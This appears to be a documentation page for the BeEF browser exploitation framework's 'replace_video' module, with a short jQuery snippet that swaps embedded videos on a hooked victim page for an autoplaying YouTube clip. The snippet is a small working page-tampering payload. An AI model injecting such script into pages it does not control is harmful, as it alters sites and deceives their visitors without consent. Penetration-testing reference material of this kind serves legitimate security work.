## Summary

* **Objective**: Replace an embedded video with our own
* **Authors**: Yori Kvitchko, antisnatchor
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/hooked_domain/replace_video)

## Internal Working

By default, this replaces all `<embed>` tags to a youtube video of rickroll.

An element is selected using the jQuery selector notation

```js

$j('<%= @jquery_selector %>').each(function(){
            var width = $j(this).css('width');
            var height = $j(this).css('height');
            $j(this).replaceWith('<embed src="http://www.youtube.com/v/<%= @youtube_id %>?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="' + width + '" height="' + height + '">');
});

```

## Feedback

